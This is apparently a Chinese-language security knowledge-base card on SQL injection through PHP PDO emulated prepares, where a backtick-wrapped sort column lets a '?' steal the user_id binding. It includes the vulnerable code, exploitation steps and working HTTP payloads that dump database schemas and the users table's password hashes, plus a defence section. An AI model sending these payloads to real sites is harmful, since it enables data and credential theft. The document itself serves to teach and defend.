---
id: web-generic-sqli-pdo-emulated-prepare-identifier
title: PDO 模拟预编译占位符错位注入：反引号列名拼接配合反斜杠逃逸
type: scenario
domain: web
path: web/generic/sqli
technique: pdo-emulated-prepare-placeholder-misbinding
aliases:
- PDO 模拟预编译注入
- PDO 占位符错位
- PDO 列名拼接注入
- emulated prepare SQLi
- ATTR_EMULATE_PREPARES 注入
- 反引号列名注入
tags:
- sqli
- php
- pdo
- mysql
- emulated-prepare
- identifier-injection
- column-name
- order-by
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V182
  verified_at: '2026-11-06T19:54:29+08:00'
  notes: 已对照原文核对（含12张图片）；PoC 未实际执行；原理描述与源码、payload 一致
---

## 一句话结论

PHP 使用 PDO 默认的模拟预编译（emulated prepares）时，如果代码把请求参数拼进列名等标识符位置，且攻击者能在拼接文本中放入 `?`，PDO 会把这个 `?` 当成绑定占位符并把本应绑定到 `WHERE` 的值替换进 `SELECT` 子句；配合列名外层反引号与残留反斜杠，参数值会脱离数据上下文变成 SQL 结构，从而读出整库数据。

## 原理

- **列名不能参数化**：`?` 只能绑定“值”，不能绑定表名、列名、`ORDER BY` 字段等语法标识符。代码为了让排序列可配置，只能把用户输入拼进 SQL：
  ```php
  $col = "`" . str_replace("`", "", $sortItem) . "`";
  $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
  $stmt->execute([$userId]);
  ```
  这里的“过滤”只有 ``str_replace("`", "", ...)`` 再补一对反引号，既没有白名单，也没有处理反斜杠等元字符。
- **模拟预编译是客户端文本替换**：PDO MySQL 默认 `PDO::ATTR_EMULATE_PREPARES=true`，`prepare()` 不会把语句交给 MySQL 服务端编译，而是 PDO 自己在客户端扫描 SQL 字符串里的 `?`，再把绑定值转义、加引号后替换进去。它扫描的是纯文本，不理解“这个 `?` 在标识符里还是在值里”。
- **占位符被劫持**：`sort` 传入 `\?;-- -`（URL 中为 `%5C%3F%3B--+-`，末尾再带 `%00`）。`$col` 变成包含 `\?` 的反引号标识符，PDO 把其中的 `?` 识别为占位符；同时 `;-- -` 让后面真正的 `WHERE user_id = ?` 落入注释（`%00` 进一步终止客户端扫描），整条语句只剩一个占位符，`execute([$userId])` 的参数个数校验因此通过。
- **转义失效与标识符提前闭合**：PDO 在客户端把 `$userId` 转义后填入该 `?`，以为它位于字符串字面量中；但外层是反引号标识符，`sort` 残留的 `\` 又紧贴 PDO 插入的引号，MySQL 实际解析时并不会按 PDO 的假设开启字符串。`$userId` 里的反引号因此提前闭合 `$col` 的标识符，随后用 ``FROM (SELECT ... AS `'1` ...)y`` 派生表提供一个同名列，`;-- -` 注释掉剩余 SQL。
- **最终效果**：语句从“按 `user_id` 查询库存”变成攻击者构造的 `SELECT <表达式> FROM (子查询)y`，`$userId` 不再是数据而成为 SELECT 结构的一部分，攻击者可读取 `information_schema` 及业务表。
- **与关闭模拟预编译的关系**：把 `ATTR_EMULATE_PREPARES` 设为 `false` 只是改变绑定实现，列名拼接本身仍然是注入点；根因是标识符位置拼接，必须用白名单修复。

## 触发条件

- PHP + PDO MySQL，且未显式关闭模拟预编译（默认开启）。
- 代码把请求参数拼接进列名、表名、`ORDER BY`、`GROUP BY` 等无法绑定 `?` 的位置，且只做了删除反引号/加反引号一类的字符过滤。
- 拼接点允许攻击者放置 `?`，并能用 `-- ` 注释或 NUL 截断让真正的占位符不参与 PDO 的计数。
- 同一请求中另一个绑定参数（案例为 `user_id`）由攻击者可控（代码允许 POST/GET 覆盖 session 值）。
- 查询结果会回显到响应中，便于直接读取注入结果。

## 利用步骤

1. 找到排序列参数：改变 `sort=item_name`、`sort=price` 等值观察返回顺序变化，确认输入进入 `SELECT` 的列名位置；确认 `user_id` 可经 GET/POST 覆盖。
2. 用 `sort=%5C%3F%3B--+-%00` 把 `?` 放进列名并注释掉真正的 `WHERE` 占位符，先让 `user_id` 取一个正常值，确认语句仍能执行、参数个数不报错。
3. 用派生表构造同名列，把 `user_id` 变成可回显的子查询：``user_id=1`+FROM+(SELECT+...)+AS+`'1`+FROM+... )y;--+-``。
4. 依次替换子查询读取 `information_schema.schemata`、`information_schema.tables`、`information_schema.columns`。
5. 最后读取业务表，例如拼接 `username:password:role` 后一次性带出账户与 bcrypt 哈希。
6. 如需十六进制规避引号过滤：库名/表名用 `0x...` 形式（案例中 `gavel` 为 `0x676176656c`，`users` 为 `0x7573657273`）。

## PoC

请求为 `application/x-www-form-urlencoded`；`sort` 固定为 `\?;-- -` 加 NUL，`user_id` 为注入载荷（`+` 表示空格）：

```http
POST /inventory.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

sort=%5C%3F%3B--+-%00&user_id=1`+FROM+(SELECT+group_concat(schema_name)+AS+`'1`+FROM+information_schema.schemata)y;--+-
```

读取表名（库名 `gavel` = `0x676176656c`）：

```http
sort=%5C%3F%3B--+-%00&user_id=1`+FROM+(SELECT+group_concat(table_name)+AS+`'1`+FROM+information_schema.tables+WHERE+table_schema=0x676176656c)y;--+-
```

读取列名（表名 `users` = `0x7573657273`）：

```http
sort=%5C%3F%3B--+-%00&user_id=1`+FROM+(SELECT+group_concat(column_name)+AS+`'1`+FROM+information_schema.columns+WHERE+table_name=0x7573657273)y;--+-
```

读取账户、密码哈希与角色：

```http
sort=%5C%3F%3B--+-%00&user_id=1`+FROM+(SELECT+group_concat(username,0x3a,password,0x3a,role)+AS+`'1`+FROM+users)y;--+-
```

`0x3a` 是冒号，用于把三列拼成 `user:hash:role` 的形式。案例按此方法取得了 `information_schema` 数据以及 `users` 表中的 bcrypt 哈希。

## 变体与关联

- **关联：标识符位置注入**。`web/generic/sqli` 已有“表名/ORDER BY 列名无法预编译”的通用卡片；本卡是其 PDO 模拟预编译变体，额外利用 PDO 客户端占位符扫描把值绑进列名位置。
- **变体：没有反引号包裹**。若代码直接 `SELECT $col`，不需要处理反引号，直接构造子查询或 `,` 追加列即可；本案例的 `\?` 与反斜杠技巧只在“输入被反引号包裹且 PDO 模拟预编译”时用于让参数错位。
- **变体：`sort` 由 POST 与 GET 双入口**。`$_POST['sort'] ?? $_GET['sort']` 这类写法扩大了可控面，WAF 只盯 GET 时容易漏掉 POST。
- **关联：PDO 模拟预编译转义问题**。`ATTR_EMULATE_PREPARES` 还可能与字符集/宽字节、`PDO::quote` 行为叠加；但本案例的核心不是字符集，而是占位符位置错误。
- **修复对比**：把列名改为白名单映射（`['name'=>'item_name','price'=>'price']`），而不是过滤字符串；对 `user_id` 使用 `(int)` 强制转换并保留服务端会话取值。

## 检测与防御

- **代码审计特征**：搜索 `prepare("SELECT $`、`prepare("... ORDER BY $`、`$_GET['sort']`/`$_POST['sort']` 进入列名、以及 ``str_replace("`", "", ...)`` 这种“删反引号再补反引号”的伪过滤。
- **白名单**：排序列必须用显式数组映射，未知值回退到固定列；不要依赖反引号包裹和 `str_replace`。
- **参数化**：值位置坚持 `?`/命名参数绑定；`user_id` 取自会话时也应在 SQL 前做整数校验，避免 GET/POST 覆盖。
- **配置**：关闭模拟预编译（`PDO::ATTR_EMULATE_PREPARES => false`）可作为纵深防御，但不能修复列名拼接。
- **检测**：WAF/日志关注 `sort` 参数中的 `?`、`%00`、`--`、反引号、`information_schema`、`group_concat` 等组合；数据库侧审计异常 `SELECT` 与对 `information_schema` 的批量查询。
- **最小权限**：Web 数据库账户只授予业务表所需权限，禁止读取其他库的 `information_schema` 元数据并不能完全阻止，但能降低横向影响。
